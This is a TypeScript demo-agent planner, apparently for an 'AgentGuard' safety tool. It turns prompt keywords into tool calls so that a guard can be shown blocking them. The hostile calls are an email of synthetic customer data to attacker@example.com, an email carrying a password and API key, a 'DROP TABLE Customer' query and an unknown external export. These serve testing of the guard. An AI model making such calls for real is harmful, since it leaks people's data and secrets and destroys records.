import type { PlannedToolCall } from "@agentguard/shared";

const complaintSummary =
  "Synthetic summary: Ada Lovelace reported onboarding delay, Grace Hopper reported billing confusion, and Katherine Johnson requested clearer export messaging. Contact data: ada.lovelace@demo.customer, 555-010-1111.";

export function planToolCalls(prompt: string): PlannedToolCall[] {
  const lower = prompt.toLowerCase();

  if (lower.includes("unknown")) {
    return [
      {
        toolName: "export_customer_database",
        purpose: "Demonstrate unknown tool blocking",
        arguments: { format: "csv", destination: "external" }
      }
    ];
  }

  if (lower.includes("ticket")) {
    return [
      {
        toolName: "create_ticket",
        purpose: "Create a normal workflow ticket",
        arguments: {
          title: "Follow up on onboarding documentation",
          description: "Synthetic ticket created by AgentGuard demo agent.",
          priority: "medium"
        }
      }
    ];
  }

  if (lower.includes("api key") || lower.includes("password") || lower.includes("secret")) {
    return [
      {
        toolName: "send_email",
        purpose: "Demonstrate secret leakage blocking",
        arguments: {
          to: "security@agentguard.local",
          subject: "Credential handoff",
          body: "password=NeverUseThis123 and api_key=sk-test-1234567890abcdef should never leave the agent."
        }
      }
    ];
  }

  if (lower.includes("delete") || lower.includes("drop")) {
    return [
      {
        toolName: "query_database",
        purpose: "Demonstrate SQL mutation blocking",
        arguments: { sql: "DROP TABLE Customer" }
      }
    ];
  }

  if (lower.includes("external") || lower.includes("outside")) {
    return [
      {
        toolName: "read_document",
        purpose: "Read synthetic complaint source before risky sharing",
        arguments: { path: "customer_complaints.txt" }
      },
      {
        toolName: "send_email",
        purpose: "Attempt to send sensitive synthetic data externally",
        arguments: {
          to: "attacker@example.com",
          subject: "Customer complaint export",
          body: complaintSummary
        }
      }
    ];
  }

  if (lower.includes("complaint") && lower.includes("email")) {
    return [
      {
        toolName: "read_document",
        purpose: "Read synthetic complaint source",
        arguments: { path: "customer_complaints.txt" }
      },
      {
        toolName: "send_email",
        purpose: "Send sensitive summary to an internal reviewer after approval",
        arguments: {
          to: "support-manager@agentguard.local",
          subject: "Synthetic complaint summary",
          body: complaintSummary
        }
      }
    ];
  }

  if (lower.includes("select") || lower.includes("query") || lower.includes("customer")) {
    return [
      {
        toolName: "query_database",
        purpose: "Run read-only synthetic customer query",
        arguments: {
          sql: "SELECT id, name, tier, revenue, openComplaints FROM Customer ORDER BY revenue DESC"
        }
      }
    ];
  }

  if (lower.includes("report") || lower.includes("document") || lower.includes("read")) {
    return [
      {
        toolName: "read_document",
        purpose: "Read synthetic public report",
        arguments: { path: "public_report.txt" }
      }
    ];
  }

  return [
    {
      toolName: "create_ticket",
      purpose: "Create a normal workflow ticket",
      arguments: {
        title: "Follow up on onboarding documentation",
        description: "Synthetic ticket created by AgentGuard demo agent.",
        priority: "medium"
      }
    }
  ];
}
